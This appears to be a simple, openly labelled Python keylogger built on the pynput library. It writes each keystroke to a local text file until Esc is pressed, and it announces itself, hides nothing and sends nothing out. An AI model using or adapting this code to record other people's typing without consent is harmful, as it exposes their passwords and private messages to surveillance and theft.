from pynput.keyboard import Key, Listener

# Define the log file path
log_file = "keylog.txt"

# Function to write to the log file
def write_to_log(key):
    # Open the log file in append mode
    with open(log_file, "a") as f:
        # Write the pressed key to the file
        f.write(f"{key} ")

# Function that is called when a key is pressed
def on_press(key):
    try:
        # Convert the key to a string (single characters and special keys)
        k = str(key.char)
    except AttributeError:
        # Convert special keys to strings
        k = str(key)
    
    # Write the key to the log file
    write_to_log(k)

# Function that is called when the listener is stopped
def on_release(key):
    # Stop the listener
    if key == Key.esc:
        return False

def main():
    print("Keylogger started. Press 'Esc' to stop and exit.")

    # Start the listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
